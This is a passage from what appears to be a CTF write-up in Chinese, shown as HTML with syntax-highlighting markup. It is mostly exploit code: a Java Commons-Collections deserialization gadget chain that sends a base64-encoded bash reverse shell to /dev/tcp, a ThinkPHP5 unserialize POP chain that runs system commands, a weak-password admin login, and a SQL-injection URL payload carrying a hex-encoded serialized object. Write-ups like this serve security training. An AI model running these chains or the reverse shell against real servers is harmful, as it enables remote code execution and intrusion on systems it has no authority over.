class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">setProperty</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.collections.enableUnsafeSerialization"</span><span class="token punctuation">,</span> <span class="token string">"true"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> transformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"java.lang.Runtime"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                        <span class="token string">"getMethod"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token string">"getRuntime"</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>                <span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                        <span class="token string">"invoke"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token class-name">Object</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span><span class="token keyword">null</span><span class="token punctuation">,</span><span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span>                <span class="token punctuation">)</span><span class="token punctuation">,</span>                <span class="token keyword">new</span> <span class="token class-name">InvokerTransformer</span><span class="token punctuation">(</span>                        <span class="token string">"exec"</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Class</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token class-name">String</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                        <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span><span class="token string">"bash -c &#123;echo,x&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;"</span><span class="token punctuation">&#125;</span> <span class="token comment">// x: "bash -i >&amp; /dev/tcp/ip/port 0>&amp;1" encoded with base64</span>                <span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span> fakeTransformers <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Transformer</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>                <span class="token keyword">new</span> <span class="token class-name">ConstantTransformer</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token class-name">ChainedTransformer</span> chainedTransformer <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ChainedTransformer</span><span class="token punctuation">(</span>fakeTransformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> innerMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> outerMap <span class="token operator">=</span> <span class="token class-name">LazyMap</span><span class="token punctuation">.</span><span class="token function">decorate</span><span class="token punctuation">(</span>innerMap<span class="token punctuation">,</span>chainedTransformer<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">TiedMapEntry</span> tiedMapEntry <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TiedMapEntry</span><span class="token punctuation">(</span>outerMap<span class="token punctuation">,</span><span class="token string">"feng1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Map</span> expMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        expMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>tiedMapEntry<span class="token punctuation">,</span><span class="token string">"feng2"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        outerMap<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">"feng1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Class</span> clazz <span class="token operator">=</span> <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"org.apache.commons.collections.functors.ChainedTransformer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Field</span> field <span class="token operator">=</span> clazz<span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span><span class="token string">"iTransformers"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        field<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>chainedTransformer<span class="token punctuation">,</span>transformers<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span>expMap<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> fileName <span class="token operator">=</span> <span class="token string">"output.bin"</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">(</span><span class="token class-name">FileOutputStream</span> fos <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">FileOutputStream</span><span class="token punctuation">(</span>fileName<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            fos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"Byte array has been written to "</span> <span class="token operator">+</span> fileName<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">IOException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// unserialize(bytes); // test</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// test</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token keyword">try</span><span class="token punctuation">(</span><span class="token class-name">ByteArrayInputStream</span> bain <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ObjectInputStream</span> oin <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span>bain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            oin<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>        <span class="token keyword">try</span><span class="token punctuation">(</span><span class="token class-name">ByteArrayOutputStream</span> baout <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">ObjectOutputStream</span> oout <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>baout<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            oout<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> baout<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>Dependency：</p><pre class="language-java" data-language="java"><code class="language-java"><span class="token generics"><span class="token punctuation">&lt;</span>dependency<span class="token punctuation">></span></span>      <span class="token generics"><span class="token punctuation">&lt;</span>groupId<span class="token punctuation">></span></span>commons<span class="token operator">-</span>collections<span class="token operator">&lt;</span><span class="token operator">/</span>groupId<span class="token operator">></span>      <span class="token generics"><span class="token punctuation">&lt;</span>artifactId<span class="token punctuation">></span></span>commons<span class="token operator">-</span>collections<span class="token operator">&lt;</span><span class="token operator">/</span>artifactId<span class="token operator">></span>      <span class="token generics"><span class="token punctuation">&lt;</span>version<span class="token punctuation">></span></span><span class="token number">3.2</span><span class="token number">.2</span><span class="token operator">&lt;</span><span class="token operator">/</span>version<span class="token operator">></span>    <span class="token operator">&lt;</span><span class="token operator">/</span>dependency<span class="token operator">></span></code></pre><p>连接后反弹 Shell 即可获得 flag</p><h1 id="thinkshop"><a href="#thinkshop" class="headerlink" title="thinkshop"></a>thinkshop</h1><h2 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h2><ol><li>登录鉴权</li><li>php unserialize thinkphp5 利用链</li><li>sql injection</li></ol><h2 id="1-login"><a href="#1-login" class="headerlink" title="1. login"></a>1. login</h2><p><img src="image-1.png" alt="image-1.png"></p><p><img src="image-2.png" alt="image-2.png"><br>username 实际上索引的是 id，解password的md5得123456<br>使用 1,123456 登录后台</p><h2 id="2-unserialize-poc-thinkphp-5"><a href="#2-unserialize-poc-thinkphp-5" class="headerlink" title="2. unserialize poc (thinkphp 5)"></a>2. unserialize poc (thinkphp 5)</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Pivot</span><span class="token punctuation">;</span>    <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'display_errors'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Windows</span><span class="token punctuation">&#123;</span>        <span class="token keyword">private</span> <span class="token variable">$files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token keyword">new</span> <span class="token class-name">Pivot</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token variable">$aaa</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'system'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'cat /fffflllaaaagggg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token function">bin2hex</span><span class="token punctuation">(</span><span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">&#123;</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Model</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token variable">$parent</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">append</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'jelly'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'getError'</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name class-name-fully-qualified">relation<span class="token punctuation">\</span>BelongsTo</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">parent</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Relation</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Relation</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">OneToOne</span> <span class="token keyword">extends</span> <span class="token class-name">Relation</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">BelongsTo</span> <span class="token keyword">extends</span> <span class="token class-name">OneToOne</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">selfRelation</span> <span class="token operator">=</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">''</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Query</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">model</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcache</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Output</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token variable">$handle</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcache</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcache</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$config</span>  <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string single-quoted-string">'expire'</span>       <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>            <span class="token string single-quoted-string">'session_name'</span> <span class="token operator">=></span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcached</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">&#123;</span>    <span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Request</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Memcached</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$handler</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string single-quoted-string">'prefix'</span>   <span class="token operator">=></span> <span class="token string single-quoted-string">'jelly/'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">tag</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Request</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">&#123;</span>    <span class="token keyword">class</span> <span class="token class-name-definition class-name">Request</span><span class="token punctuation">&#123;</span>        <span class="token keyword">protected</span> <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$function</span><span class="token punctuation">,</span><span class="token variable">$parameter</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">filter</span> <span class="token operator">=</span> <span class="token variable">$function</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">get</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string double-quoted-string">"jelly"</span><span class="token operator">=></span><span class="token variable">$parameter</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre><p><img src="image-3.png" alt="image-3.png"></p><p>反序列化 触发点在 goods.html 里：</p><p><img src="image-4.png" alt="image-4.png"></p><h2 id="3-sql-injection"><a href="#3-sql-injection" class="headerlink" title="3. sql injection"></a>3. sql injection</h2><p><img src="image-5.png" alt="image-5.png"></p><p>在 $key 处 进行 injection，poc：</p><pre class="language-none"><code class="language-none">data%60%3dunhex(%2759546f784f6e74704f6a4137547a6f794e7a6f6964476870626d746363484a765932567a633178776158426c633178586157356b6233647a496a6f784f6e747a4f6a4d304f69494164476870626d746363484a765932567a633178776158426c633178586157356b6233647a41475a706247567a496a74684f6a453665326b364d4474504f6a45334f694a3061476c75613178746232526c6246785161585a76644349364d7a7037637a6f354f6949414b6742686348426c626d51694f3245364d547037637a6f314f694a715a57787365534937637a6f344f694a6e5a585246636e4a766369493766584d364f446f6941436f415a584a79623349694f3038364d7a4136496e526f61573572584731765a47567358484a6c624746306157397558454a6c624739755a334e55627949364d7a7037637a6f784e546f6941436f41633256735a6c4a6c6247463061573975496a74694f6a4137637a6f344f6949414b6742786457567965534937547a6f784e446f6964476870626d74635a474a635558566c636e6b694f6a453665334d364f446f6941436f416257396b5a5777694f3038364d6a4136496e526f6157357258474e76626e4e76624756635433563063485630496a6f794f6e747a4f6a6b364967417141484e306557786c6379493759546f784f6e74704f6a4137637a6f334f694a6e5a58524264485279496a7439637a6f794f446f694148526f6157357258474e76626e4e7662475663543356306348563041476868626d52735a534937547a6f794f546f6964476870626d74636332567a63326c76626c786b636d6c325a584a63545756745932466a614755694f6a493665334d364d5441364967417141476868626d52735a5849694f3038364d6a6736496e526f6157357258474e685932686c5847527961585a6c636c784e5a57316a59574e6f5a5751694f6a4d3665334d364d5441364967417141476868626d52735a5849694f3038364d544d36496e526f6157357258464a6c6358566c633351694f6a493665334d364e6a6f6941436f415a325630496a74684f6a453665334d364e546f69616d567362486b694f334d364d6a4136496d4e68644341765a6d5a6d5a6d7873624746685957466e5a32646e496a7439637a6f354f6949414b67426d615778305a5849694f334d364e6a6f6963336c7a64475674496a7439637a6f784d446f6941436f4162334230615739756379493759546f784f6e747a4f6a5936496e42795a575a7065434937637a6f324f694a715a577873655338694f33317a4f6a593649674171414852685a794937596a6f784f33317a4f6a6b364967417141474e76626d5a705a79493759546f794f6e747a4f6a5936496d563463476c795a534937637a6f774f6949694f334d364d544936496e4e6c63334e7062323566626d46745a534937637a6f774f6949694f3331396658317a4f6a45784f6949414b6742696157356b515852306369493759546f784f6e74704f6a4137637a6f774f6949694f333139637a6f324f694a7759584a6c626e51694f3038364d6a4136496e526f6157357258474e76626e4e76624756635433563063485630496a6f794f6e747a4f6a6b364967417141484e306557786c6379493759546f784f6e74704f6a4137637a6f334f694a6e5a58524264485279496a7439637a6f794f446f694148526f6157357258474e76626e4e7662475663543356306348563041476868626d52735a534937547a6f794f546f6964476870626d74636332567a63326c76626c786b636d6c325a584a63545756745932466a614755694f6a493665334d364d5441364967417141476868626d52735a5849694f3038364d6a6736496e526f6157357258474e685932686c5847527961585a6c636c784e5a57316a59574e6f5a5751694f6a4d3665334d364d5441364967417141476868626d52735a5849694f3038364d544d36496e526f6157357258464a6c6358566c633351694f6a493665334d364e6a6f6941436f415a325630496a74684f6a453665334d364e546f69616d567362486b694f334d364d6a4136496d4e68644341765a6d5a6d5a6d7873624746685957466e5a32646e496a7439637a6f354f6949414b67426d615778305a5849694f334d364e6a